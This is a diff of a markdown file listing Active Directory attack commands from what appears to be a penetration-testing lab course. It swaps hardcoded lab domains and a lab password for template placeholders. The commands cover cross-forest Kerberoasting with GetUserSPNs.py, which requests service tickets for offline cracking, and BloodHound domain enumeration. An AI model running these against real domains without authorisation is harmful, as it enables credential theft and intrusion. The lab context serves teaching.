@@ -9,13 +9,13 @@
 ## 1. `shellsession` _(output omitted)_
 
 ```bash
-GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL {{DOMAIN_UPPER}}/wley
 ```
 
 ## 2. `shellsession` _(output omitted)_
 
 ```bash
-GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL {{DOMAIN_UPPER}}/wley  
 ```
 
 ## 3. `shellsession` _(output omitted)_
@@ -27,7 +27,7 @@ cat /etc/resolv.conf
 ## 4. `shellsession` _(output omitted)_
 
 ```bash
-bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+bloodhound-python -d {{DOMAIN_UPPER}} -dc ACADEMY-EA-DC01 -c All -u {{USERNAME}} -p {{PASSWORD}}
 ```
 
 ## 5. `shellsession` _(output omitted)_
@@ -45,6 +45,6 @@ cat /etc/resolv.conf
 ## 7. `shellsession` _(output omitted)_
 
 ```bash
-bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
+bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}}
 ```
 
